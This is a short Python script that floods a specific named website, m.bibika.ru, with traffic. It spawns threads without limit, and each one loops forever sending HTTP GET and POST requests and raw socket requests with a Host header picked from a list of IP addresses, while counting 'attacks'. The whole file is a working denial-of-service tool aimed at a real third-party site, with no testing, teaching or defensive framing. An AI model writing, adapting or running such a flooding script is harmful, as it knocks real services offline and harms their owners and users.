# coding: utf8
import threading
from random import choice
import requests
import socket


target = socket.gethostbyname("m.bibika.ru")
ips = ['217.160.0.137', '212.164.222.45']
port = 80
attack_num = 0


def dos():
    while True:
        try:
            requests.get("http://m.bibika.ru/")
            requests.post("http://m.bibika.ru/")

            global attack_num
            attack_num += 1

            ip = choice(ips)

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
        except Exception as error:
            print(error)


while True:
    threading.Thread(target=dos).start()
    print(f'Send ping to {target}:{port}')
    print(f'Numbers of attack: {attack_num}')
